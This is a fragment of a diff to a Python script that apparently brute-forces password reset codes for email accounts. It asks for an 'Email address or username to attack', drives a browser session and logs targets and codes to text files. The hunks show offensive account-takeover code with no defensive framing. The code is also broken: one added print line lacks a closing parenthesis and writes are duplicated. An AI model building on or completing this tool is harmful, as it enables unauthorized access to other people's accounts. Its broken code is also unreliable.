@@ -118,9 +118,7 @@
         else:
           print(s.join(success))
   else:
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
+    print(int(attempt)
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     print(browser.geturl())
@@ -132,18 +130,16 @@
       print(y)
       browser.close()
       reset = int(-1)
-  return reset, y, browser
+  return reset
 
 os.system('clear')
 passcode6()
-f = open("emails.txt", "r")
+f = open("emails.txt", "a+")
 ehack = input('Email address or username to attack:') or f.readlines(-1)
-f.close()
-reset = int(input('Code: ') or 99999999)
-reset1 = reset
-f = open("emails.txt", "a")
-z = open("passcoder.txt", "a")
 f.write(ehack)
 f.close()
-z.write(str(reset1))
-z.close()
+reset = int(input('Code: ') or 1)
+reset1 = reset
+f = open("emails.txt", "a+")
+z = open("passcoder.txt", "a+")
+f.write(ehack)
